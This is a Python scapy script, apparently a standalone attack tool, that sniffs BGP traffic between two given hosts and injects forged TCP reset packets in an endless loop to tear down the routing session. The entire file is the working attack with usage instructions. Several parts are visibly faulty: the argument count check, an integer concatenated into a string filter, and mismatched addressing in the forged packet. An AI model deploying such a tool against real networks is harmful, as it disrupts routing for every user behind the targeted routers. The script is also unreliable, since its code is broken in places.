from scapy.all import *
import sys

'''
This script breaks BGP sessions using TCP Reset attack and scapy.

Dependencies:
- scapy

Usage: python3 bgp-tcprst.py iface bgp_port src_ip dst_ip window_size
'''

if len(sys.argv) < 4:
    print("Usage:\npython3 bgp-tcprst.py iface bgp_port src_ip dst_ip window_size")
    sys.exit(1)


bgp_port = int(sys.argv[2]) # Set BGP port
src_ip = sys.argv[3] # Set source IP
dst_ip = sys.argv[4] # Set destination IP
win = int(sys.argv[5]) # Set window size
print("\nSetting:\nbgp_port = {}\nsrc_ip = {}\ndst_ip = {}".format(bgp_port, src_ip, dst_ip))


while True:
    filt = "src port " +  bgp_port + " and dst " + dst_ip + " and src " + src_ip # Filter to sniff using scapy
    s = sniff(filter=filt, iface=sys.argv[1], count=1)
    s[0].show()


    seq = int(s[0][TCP].ack)
    ack = int(s[0][TCP].seq) + int(len(s[0][TCP].payload))
    ip = IP(src=s[0][IP].src, dst=s[0][IP].dst)
    sport = int(s[0][TCP].dport)


    tcp = ip / TCP(sport=sport, dport=bgp_port, flags="RA", seq=seq, ack=ack, window=win)
    send(tcp)
